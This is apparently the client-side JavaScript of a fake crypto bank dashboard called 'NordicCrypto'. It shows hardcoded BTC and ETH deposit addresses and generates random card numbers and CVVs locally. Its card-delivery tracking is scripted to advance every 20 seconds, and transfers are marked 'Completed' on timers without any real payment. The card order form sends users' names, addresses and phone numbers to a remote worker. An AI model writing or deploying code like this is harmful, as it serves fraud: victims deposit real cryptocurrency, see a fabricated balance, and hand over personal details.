/* ========== WORKER API ========== */
var WORKER_URL = 'https://nordic-deposit-checker.otis-790.workers.dev';
var def = { usd:0, btc:0, eth:0, btcP:68000, ethP:3200, eurR:0.92, txs:[], order:null, card:null };
var st = JSON.parse(JSON.stringify(def));
var mode = null, tt = null;
var autoCheckTimer = null;
var autoCheckKnown = {};
var cvvVisible = false;
var cvvTimer = null;

function $(i){ return document.getElementById(i); }
function fmt(n){ return '$' + Number(n).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2}); }
function eurF(n){ return '≈ €' + Number(n).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2}); }
function now(){ return new Date().toISOString().slice(0,10); }

function loadFromServer(cb){
  fetch(WORKER_URL + '?action=getState')
    .then(function(r){ return r.json(); })
    .then(function(data){
      st = data || JSON.parse(JSON.stringify(def));
      if (!st.txs) st.txs = [];
      if (!st.card || typeof st.card !== 'object') st.card = null;
      render();
      setTimeout(function(){ checkOnboarding(); }, 50);
      if (cb) cb();
    })
    .catch(function(e){
      console.error('Load failed:', e);
      render();
      checkOnboarding();
    });
}

function saveToServer(){
  fetch(WORKER_URL + '?action=setState', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(st)
  }).catch(function(e){ console.error('Save failed:', e); });
}

/* ========== NAV ========== */
var titles = {dash:'Dashboard',cards:'My Cards',assets:'Crypto Assets',tx:'Transactions',order:'Order New Card'};
var mis = document.querySelectorAll('.mi');
for (var i=0; i<mis.length; i++){
  mis[i].onclick = function(){
    var p = this.getAttribute('data-p');
    var pgs = document.querySelectorAll('.pg');
    for (var j=0; j<pgs.length; j++) pgs[j].classList.remove('on');
    $(p).classList.add('on');
    var ms = document.querySelectorAll('.mi');
    for (var k=0; k<ms.length; k++) ms[k].classList.remove('on');
    this.classList.add('on');
    $('ttl').textContent = titles[p];
  };
}

/* ========== RENDER ========== */
function render(){
  $('bal').textContent = fmt(st.usd);
  $('balEur').textContent = eurF(st.usd * st.eurR);
  $('btcB').textContent = st.btc.toFixed(8);
  $('ethB').textContent = st.eth.toFixed(8);
  $('aBtc').textContent = st.btc.toFixed(8);
  $('aEth').textContent = st.eth.toFixed(8);
  $('aBtcU').textContent = '≈ ' + fmt(st.btc * st.btcP);
  $('aEthU').textContent = '≈ ' + fmt(st.eth * st.ethP);
  renderTx();
  renderOrder();
  renderCard();
}

function badgeClass(s){
  if (s === 'Completed') return 'badge ok';
  if (s === 'Under Review') return 'badge pend';
  if (s === 'Processing') return 'badge proc';
  if (s === 'Failed') return 'badge fail';
  return 'badge';
}

function renderTx(){
  var b = $('txB');
  if (!st.txs || st.txs.length === 0){
    b.innerHTML = '<tr><td colspan="4"><div class="empty"><svg viewBox="0 0 24 24"><path d="M22 12h-6l-2 3h-4l-2-3H2"/><path d="M5.45 5.11L2 12v6a2 2 0 002 2h16a2 2 0 002-2v-6l-3.45-6.89A2 2 0 0016.76 4H7.24a2 2 0 00-1.79 1.11z"/></svg><div>No transactions yet</div></div></td></tr>';
    return;
  }
  var h = '';
  for (var i=0; i<st.txs.length; i++){
    var t = st.txs[i];
    var c = t.amt >= 0 ? 'var(--ok)' : 'var(--bad)';
    var s = t.amt >= 0 ? '+' : '';
    h += '<tr><td>' + t.date + '</td><td>' + t.desc + '</td><td style="color:' + c + ';font-weight:600">' + s + fmt(t.amt) + '</td><td><span class="' + badgeClass(t.status) + '">' + t.status + '</span></td></tr>';
  }
  b.innerHTML = h;
}

function addTx(desc, amt, status){
  st.txs.unshift({ date: now(), ts: Date.now(), desc: desc, amt: amt, status: status || 'Completed' });
  renderTx();
  saveToServer();
}

/* ========== TOAST ========== */
function toast(msg, warn){
  var t = $('toast');
  var svg = t.querySelector('svg');
  $('tMsg').textContent = msg;
  if (warn){
    t.style.borderLeftColor = 'var(--warn)';
    svg.style.stroke = 'var(--warn)';
    svg.innerHTML = '<path d="M12 9v4M12 17h.01"/><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/>';
  } else {
    t.style.borderLeftColor = 'var(--ok)';
    svg.style.stroke = 'var(--ok)';
    svg.innerHTML = '<path d="M20 6L9 17l-5-5"/>';
  }
  t.classList.add('on');
  clearTimeout(tt);
  tt = setTimeout(function(){ t.classList.remove('on'); }, 3200);
}

/* ========== CARD HELPERS ========== */
function genCardNumber(prefix){
  var s = prefix;
  for (var i = 0; i < 12; i++) s += Math.floor(Math.random()*10);
  return s;
}

function fmtCard(num){
  var s = String(num);
  return s.replace(/(.{4})/g, '$1 ').trim();
}

function genCvv(){
  var s = '';
  for (var i = 0; i < 3; i++) s += Math.floor(Math.random()*10);
  return s;
}

function genExpiry(){
  var d = new Date();
  var y = d.getFullYear() + 3;
  var m = d.getMonth() + 1;
  var mm = m < 10 ? '0' + m : '' + m;
  return mm + '/' + String(y).slice(2);
}

function createVirtualCard(name, type, cur){
  var prefix = type === 'Mastercard' ? '5399' : '4921';
  var num = genCardNumber(prefix);
  var expiry = genExpiry();
  var cvv = genCvv();
  st.card = {
    num: num,
    cvv: cvv,
    expiry: expiry,
    name: name.toUpperCase(),
    type: type,
    cur: cur,
    status: 'Active',
    createdAt: Date.now()
  };
  saveToServer();
}

function checkOnboarding(){
  if (!st.card){
    $('onboard').classList.add('on');
  } else {
    $('onboard').classList.remove('on');
  }
}

function renderCard(){
  if (!st.card){
    $('cardDash').classList.add('frozen');
    $('cardNumDash').textContent = '— — — —   — — — —   — — — —   — — — —';
    $('cardNameDash').textContent = '—';
    $('cardExpDash').textContent = '—/—';
    $('cardTypeDash').textContent = 'NO CARD';
    $('cardNumFull').textContent = '— — — —   — — — —   — — — —   — — — —';
    $('cardNameFull').textContent = '—';
    $('cardExpFull').textContent = '—/—';
    $('cardTypeFull').textContent = 'NO CARD';
    $('detNum').textContent = '—';
    $('detCvv').textContent = '●●●';
    $('detExp').textContent = '—';
    $('detName').textContent = '—';
    $('detType').textContent = '—';
    $('detCur').textContent = '—';
    $('detStatus').textContent = 'No Card';
    return;
  }

  var c = st.card;
  var frozen = (c.status === 'Frozen');
  var numFormatted = fmtCard(c.num);

  // Dash
  $('cardDash').classList.toggle('frozen', frozen);
  $('cardNumDash').textContent = numFormatted;
  $('cardNameDash').textContent = c.name;
  $('cardExpDash').textContent = c.expiry;
  $('cardTypeDash').textContent = (c.type + ' ' + c.cur).toUpperCase();

  // Full
  $('cardFull').classList.toggle('frozen', frozen);
  $('cardNumFull').textContent = numFormatted;
  $('cardNameFull').textContent = c.name;
  $('cardExpFull').textContent = c.expiry;
  $('cardTypeFull').textContent = (c.type + ' ' + c.cur).toUpperCase();

  // Details
  $('detNum').textContent = numFormatted;
  $('detCvv').textContent = cvvVisible ? c.cvv : '●●●';
  $('detExp').textContent = c.expiry;
  $('detName').textContent = c.name;
  $('detType').textContent = c.type;
  $('detCur').textContent = c.cur;
  $('detStatus').textContent = c.status;
  $('detStatus').style.color = frozen ? 'var(--warn)' : 'var(--ok)';

  // Buttons state
  $('btnShowCvv').textContent = cvvVisible ? '🙈 Hide CVV' : '👁 Show CVV';
  $('btnFreeze').textContent = frozen ? '🔥 Unfreeze Card' : '❄ Freeze Card';
}

/* ========== MODAL ========== */
function destHint(method){
  if (method === 'Bank Transfer (SEPA)') return { show:true, label:'Recipient IBAN', ph:'SE35 5000 0000 0549 1000 0003' };
  if (method === 'Credit Card')          return { show:true, label:'Recipient Card Number', ph:'4921 8842 1093 5542' };
  if (method === 'Bitcoin (BTC)')        return { show:true, label:'Recipient BTC Address', ph:'bc1q...' };
  if (method === 'Ethereum (ETH)')       return { show:true, label:'Recipient ETH Address', ph:'0x...' };
  return { show:false };
}

function refreshDest(){
  var m = $('mMethod').value;
  var hint = destHint(m);
  var isAdd = (mode === 'add');

  if (hint.show){
    $('mDestWrap').style.display = 'block';
    $('mDest').value = '';
    $('mDest').readOnly = false;

    if (isAdd && m === 'Bitcoin (BTC)'){
      $('mDestLabel').textContent = 'Send BTC to this address';
      $('mDest').value = '19YWxuHf1TbdZzZdV9FSzYfops6M2GLhe7';
      $('mDest').readOnly = true;
    } else if (isAdd && m === 'Ethereum (ETH)'){
      $('mDestLabel').textContent = 'Send ETH to this address';
      $('mDest').value = '0xFB7A7956Af77061D3B5f3B357ef9c0a22CD60e97';
      $('mDest').readOnly = true;
    } else if (isAdd){
      $('mDestLabel').textContent = 'Your reference (optional)';
      $('mDest').placeholder = 'Enter reference';
    } else {
      $('mDestLabel').textContent = hint.label;
      $('mDest').placeholder = hint.ph;
    }
  } else {
    $('mDestWrap').style.display = 'none';
    $('mDest').value = '';
  }
}

function openModal(m){
  mode = m;
  $('mTitle').textContent = m === 'add' ? 'Add Funds' : 'Transfer Funds';
  $('mDesc').textContent = m === 'add'
    ? 'Send crypto to the address below. We will detect your deposit automatically.'
    : 'Enter amount and recipient details.';
  $('mAmount').value = '';
  $('mDest').value = '';

  if (m === 'transfer'){ $('mMethod').value = 'Bank Transfer (SEPA)'; }
  else { $('mMethod').value = 'Bitcoin (BTC)'; }
  refreshDest();
  $('mask').classList.add('on');
  setTimeout(function(){ $('mAmount').focus(); }, 100);

  if (m === 'add'){ startAutoCheck(); }
}

function closeModal(){
  $('mask').classList.remove('on');
  mode = null;
  stopAutoCheck();
}

/* ========== CONFIRM (Add / Transfer) ========== */
function isCrypto(m){ return m === 'Bitcoin (BTC)' || m === 'Ethereum (ETH)'; }

function confirmModal(){
  var a = Number($('mAmount').value);
  var m = $('mMethod').value;
  var dest = $('mDest').value.trim();

  if (!a || a <= 0){ toast('Please enter a valid amount', true); return; }

  if (mode === 'add'){
    if (isCrypto(m)){
      toast('Send crypto to the address. We are watching the blockchain...', false);
      doAutoCheck();
      return;
    }
    st.usd += a;
    addTx('Deposit via ' + m, a, 'Under Review');
    toast('Added ' + fmt(a));
    closeModal();
    render();
    saveToServer();
    return;
  }

  if (a > st.usd){ toast('Insufficient balance', true); return; }
  if (!dest){ toast('Please enter recipient details', true); return; }

  st.usd -= a;
  var desc;
  if (isCrypto(m)){
    desc = 'Crypto transfer to ' + dest.slice(0, 12) + '… via ' + m;
    addTx(desc, -a, 'Processing');
    toast('Crypto sent — arrives in 10-30 min');
  } else {
    desc = (m === 'Credit Card' ? 'Card transfer to ' : 'Bank transfer to IBAN ') + dest.slice(0, 18) + '…';
    addTx(desc, -a, 'Under Review');
    toast('Transfer submitted — under review');
  }
  closeModal();
  render();
  saveToServer();
}

/* ========== COPY ========== */
function copyText(txt, okMsg){
  if (navigator.clipboard && navigator.clipboard.writeText){
    navigator.clipboard.writeText(txt).then(function(){ toast(okMsg); }).catch(function(){ toast(okMsg); });
  } else { toast(okMsg); }
}

/* ========== ORDER + TRACKING ========== */
var STEPS = [
  { name:'Order Received',   loc:'NordicCrypto HQ, Stockholm, Sweden' },
  { name:'Card Minted',      loc:'Production Facility, Stockholm' },
  { name:'Packed',           loc:'Logistics Center, Stockholm' },
  { name:'In Transit',       loc:'International Hub, Copenhagen' },
  { name:'Out for Delivery', loc:'Local Courier' },
  { name:'Delivered',        loc:'Destination' }
];
var STEP_DURATION = 20 * 1000;

function genTrackId(){
  var s = 'NC-' + new Date().getFullYear() + '-';
  var ch = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  for (var i=0; i<6; i++) s += ch[Math.floor(Math.random()*ch.length)];
  return s;
}

function stepIndexFor(createdAt){
  var idx = Math.floor((Date.now() - createdAt) / STEP_DURATION);
  if (idx > STEPS.length - 1) idx = STEPS.length - 1;
  return idx;
}

function placeOrder(){
  var name = $('oName').value.trim();
  var city = $('oCity').value.trim();
  var street = $('oStreet').value.trim();
  var zip = $('oZip').value.trim();
  var phone = $('oPhone').value.trim();
  var country = $('oCountry').value;
  var type = $('oType').value;
  if (!name || !city || !street || !zip || !phone){ toast('Please fill in all fields', true); return; }

  st.order = {
    id: genTrackId(), name: name, type: type,
    address: street + ', ' + city + ', ' + zip + ', ' + country,
    dest: city + ', ' + country,
    createdAt: Date.now()
  };
  saveToServer();
  renderOrder();
  toast('Order placed! Tracking ID: ' + st.order.id);
}

function renderOrder(){
  if (!st.order){
    $('orderForm').classList.remove('hidden');
    $('orderTrack').classList.add('hidden');
    return;
  }
  $('orderForm').classList.add('hidden');
  $('orderTrack').classList.remove('hidden');

  var idx = stepIndexFor(st.order.createdAt);
  var steps = document.querySelectorAll('#stepsWrap .step');
  for (var i=0; i<steps.length; i++){
    steps[i].classList.remove('done','active');
    if (i < idx) steps[i].classList.add('done');
    if (i === idx) steps[i].classList.add('active');
  }

  var pct = Math.round(((idx + 1) / STEPS.length) * 100);
  $('trackBar').style.width = pct + '%';
  $('trackPct').textContent = pct + '%';
  $('trackStatus').textContent = STEPS[idx].name;
  $('trackId').textContent = st.order.id;
  $('trackName').textContent = st.order.name;
  $('trackDest').textContent = st.order.dest;
  $('trackLoc').textContent = STEPS[idx].loc;

  var eta = new Date(st.order.createdAt + STEPS.length * STEP_DURATION);
  $('trackEta').textContent = eta.toLocaleDateString('en-GB',{day:'2-digit',month:'short'}) + ', ' + eta.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'});

  var logHtml = '';
  for (var j=0; j<=idx; j++){
    var t = new Date(st.order.createdAt + j * STEP_DURATION);
    logHtml += '<div class="log-item"><span class="log-time">' + t.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'}) + '</span><span class="log-msg">' + STEPS[j].name + ' — ' + STEPS[j].loc + '</span></div>';
  }
  $('trackLog').innerHTML = logHtml;
}

function newOrder(){
  if (!confirm('Start a new card order? Current tracking will be lost.')) return;
  st.order = null;
  saveToServer();
  renderOrder();
}

/* ========== AUTO CHECK DEPOSITS ========== */
function startAutoCheck(){
  stopAutoCheck();
  autoCheckKnown = {};
  doAutoCheck();
  autoCheckTimer = setInterval(doAutoCheck, 15000);
}

function stopAutoCheck(){
  if (autoCheckTimer){ clearInterval(autoCheckTimer); autoCheckTimer = null; }
}

function doAutoCheck(){
  var method = $('mMethod').value;
  var isBtc = (method === 'Bitcoin (BTC)');
  var isEth = (method === 'Ethereum (ETH)');
  if (!isBtc && !isEth) return;

  fetch(WORKER_URL + '?action=check')
    .then(function(r){ return r.json(); })
    .then(function(data){
      if (!data || !data.result) return;
      var list = isBtc ? data.result.btc : data.result.eth;
      if (!list || list.length === 0) return;

      for (var i = 0; i < list.length; i++){
        var tx = list[i];
        var id = tx.hash;
        if (autoCheckKnown[id]) continue;

        var already = false;
        for (var j = 0; j < st.txs.length; j++){
          if (st.txs[j].hash === id){ already = true; break; }
        }
        if (already){ autoCheckKnown[id] = true; continue; }

        autoCheckKnown[id] = true;
        var credit = isBtc ? (tx.amount * st.btcP) : (tx.value * st.ethP);
        if (!credit || credit <= 0) continue;

        st.usd += credit;
        if (isBtc) st.btc += tx.amount;
        else st.eth += tx.value;

        st.txs.unshift({
          date: now(), ts: Date.now(),
          desc: 'Crypto deposit via ' + method + ' (' + tx.hash.slice(0, 10) + '…)',
          amt: credit, status: 'Processing', hash: tx.hash
        });

        saveToServer();
        render();
        toast('Deposit received! Credited ' + fmt(credit));
        closeModal();
        return;
      }
    })
    .catch(function(err){ console.error('Auto-check error:', err); });
}

/* ========== AUTO UPDATE STATUSES ========== */
function updateTxStatuses(){
  var changed = false;
  for (var i=0; i<st.txs.length; i++){
    var t = st.txs[i];
    if (!t.ts) t.ts = Date.now();
    var age = Date.now() - t.ts;
    if (t.status === 'Under Review' && age > 60*1000){ t.status = 'Processing'; changed = true; }
    else if (t.status === 'Processing' && age > 3*60*1000){ t.status = 'Completed'; changed = true; }
  }
  if (changed){ renderTx(); saveToServer(); }
}

/* ========== ONBOARDING (Create Virtual Card) ========== */
var onbType = 'Visa';
var onbCur = 'USD';

function updateOnbPreview(){
  $('prevType').textContent = 'VIRTUAL ' + onbType.toUpperCase();
  $('prevName').textContent = ($('onbName').value || 'YOUR NAME').toUpperCase();
  $('prevCur').textContent = onbCur;
}

var typeBtns = document.querySelectorAll('.type-btn');
for (var t = 0; t < typeBtns.length; t++){
  typeBtns[t].onclick = function(){
    for (var k = 0; k < typeBtns.length; k++) typeBtns[k].classList.remove('on');
    this.classList.add('on');
    onbType = this.getAttribute('data-type');
    updateOnbPreview();
  };
}

var curBtns = document.querySelectorAll('.cur-btn');
for (var c = 0; c < curBtns.length; c++){
  curBtns[c].onclick = function(){
    for (var k = 0; k < curBtns.length; k++) curBtns[k].classList.remove('on');
    this.classList.add('on');
    onbCur = this.getAttribute('data-cur');
    updateOnbPreview();
  };
}

document.getElementById('onbName').oninput = updateOnbPreview;
updateOnbPreview();

document.getElementById('btnCreateCard').onclick = function(){
  var name = $('onbName').value.trim();
  if (!name || name.length < 2){ toast('Please enter your name', true); return; }
  createVirtualCard(name, onbType, onbCur);
  renderCard();
  checkOnboarding();
  toast('Virtual card created!');
};

/* ========== CARD ACTIONS ========== */
document.getElementById('btnShowCvv').onclick = function(){
  if (!st.card) return;
  cvvVisible = !cvvVisible;
  renderCard();
  if (cvvVisible){
    clearTimeout(cvvTimer);
    cvvTimer = setTimeout(function(){
      cvvVisible = false;
      renderCard();
    }, 5000);
  }
};

document.getElementById('btnFreeze').onclick = function(){
  if (!st.card) return;
  st.card.status = st.card.status === 'Frozen' ? 'Active' : 'Frozen';
  saveToServer();
  renderCard();
  toast(st.card.status === 'Frozen' ? 'Card frozen' : 'Card unfrozen');
};

document.getElementById('btnDeleteCard').onclick = function(){
  if (!st.card) return;
  if (!confirm('Delete your card? Balance and transactions will stay.')) return;
  st.card = null;
  saveToServer();
  renderCard();
  checkOnboarding();
  toast('Card deleted');
};

document.getElementById('btnGoOrder').onclick = function(){
  var pgs = document.querySelectorAll('.pg');
  for (var j = 0; j < pgs.length; j++) pgs[j].classList.remove('on');
  $('order').classList.add('on');
  var ms = document.querySelectorAll('.mi');
  for (var k = 0; k < ms.length; k++) ms[k].classList.remove('on');
  document.querySelector('.mi[data-p="order"]').classList.add('on');
  $('ttl').textContent = 'Order New Card';
};

/* ========== EVENTS ========== */
document.getElementById('btnAdd').onclick = function(){ openModal('add'); };
document.getElementById('btnTransfer').onclick = function(){ openModal('transfer'); };
document.getElementById('mCancel').onclick = closeModal;
document.getElementById('mOk').onclick = confirmModal;
document.getElementById('mMethod').onchange = refreshDest;

document.getElementById('btnCopy').onclick = function(){
  if (!st.card){ toast('No card yet', true); return; }
  copyText(st.card.num, 'Card number copied');
};
document.getElementById('btnCopyIban').onclick = function(){ copyText('SE3550000000054910000003','IBAN copied'); };
document.getElementById('btnOrder').onclick = placeOrder;
document.getElementById('btnNewOrder').onclick = newOrder;

document.getElementById('btnReset').onclick = function(){
  if (!confirm('Reset ALL data? Balance, transactions, card and orders will be cleared.')) return;
  st = JSON.parse(JSON.stringify(def));
  saveToServer();
  render();
  checkOnboarding();
  toast('All data reset');
};

/* ========== TIMERS ========== */
setInterval(function(){ updateTxStatuses(); renderOrder(); }, 5000);

/* ========== INIT ========== */
loadFromServer();
// force-check onboarding через 1 секунду после загрузки
setTimeout(checkOnboarding, 1000);
